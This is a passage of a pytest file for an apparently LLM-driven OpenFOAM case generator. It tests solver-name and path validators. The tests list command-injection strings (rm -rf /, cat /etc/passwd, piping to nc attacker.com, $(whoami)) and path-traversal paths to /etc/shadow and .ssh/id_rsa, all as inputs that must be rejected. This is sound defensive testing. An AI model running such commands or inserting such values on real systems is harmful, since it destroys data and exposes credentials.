        mock_config.openfoam.incompressible_solvers = {"simpleFoam"}

        deps = Dependencies(
            config=mock_config,
            llm=mock_llm,
            database=mock_database,
        )

        # Step 1: Determine files
        update = determine_file_structure(state, deps)
        state = state.apply_update(update)

        assert len(state.file_structure) > 0

        # Step 2: Generate files
        update = generate_files(state, deps)
        state = state.apply_update(update)

        assert len(state.generated_files) > 0

        # Step 3: Write files
        write_files(state, deps)

        # Verify files exist
        assert (tmp_path / "case").exists()


# =============================================================================
# Security Validation Tests
# =============================================================================

class TestSecurityValidation:
    """Tests for security validation functions."""

    def test_validate_solver_name_valid(self):
        """Valid solver names should pass validation."""
        from steps import validate_solver_name

        # These are known valid solvers
        assert validate_solver_name("simpleFoam") == "simpleFoam"
        assert validate_solver_name("icoFoam") == "icoFoam"
        assert validate_solver_name("pimpleFoam") == "pimpleFoam"

    def test_validate_solver_name_rejects_unknown(self):
        """Unknown solver names should be rejected."""
        from steps import validate_solver_name, CommandInjectionError

        with pytest.raises(CommandInjectionError) as exc_info:
            validate_solver_name("unknownSolver")
        assert "Unknown solver" in str(exc_info.value)

    def test_validate_solver_name_rejects_injection(self):
        """Shell injection attempts should be rejected."""
        from steps import validate_solver_name, CommandInjectionError

        # Command injection attempts
        injection_attempts = [
            "simpleFoam; rm -rf /",
            "simpleFoam && cat /etc/passwd",
            "simpleFoam | nc attacker.com 1234",
            "$(whoami)",
            "`id`",
            "simpleFoam\nmalicious",
        ]

        for attempt in injection_attempts:
            with pytest.raises(CommandInjectionError):
                validate_solver_name(attempt)

    def test_validate_safe_path_valid(self, tmp_path):
        """Valid relative paths should pass validation."""
        from steps import validate_safe_path

        base = str(tmp_path)

        # Valid OpenFOAM paths
        assert validate_safe_path(base, "0/U") == str(tmp_path / "0/U")
        assert validate_safe_path(base, "system/controlDict") == str(tmp_path / "system/controlDict")
        assert validate_safe_path(base, "constant/polyMesh/points") == str(tmp_path / "constant/polyMesh/points")

    def test_validate_safe_path_rejects_traversal(self, tmp_path):
        """Path traversal attempts should be rejected."""
        from steps import validate_safe_path, PathTraversalError

        base = str(tmp_path)

        # Path traversal attempts
        traversal_attempts = [
            "../etc/passwd",
            "../../etc/shadow",
            "0/../../../etc/passwd",
            "/etc/passwd",
            "system/../../.ssh/id_rsa",
        ]

        for attempt in traversal_attempts:
            with pytest.raises(PathTraversalError):
                validate_safe_path(base, attempt)

    def test_write_files_rejects_traversal(self, tmp_path):
        """write_files should reject path traversal in file paths."""
        from steps import PathTraversalError

        state = CaseState(
            case_name="test",
            solver="simpleFoam",
            description="test",
            output_path=str(tmp_path / "case"),
            generated_files={
                "../../../etc/passwd": "malicious content",
            },
        )

        mock_deps = Mock()

        with pytest.raises(PathTraversalError):
            write_files(state, mock_deps)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
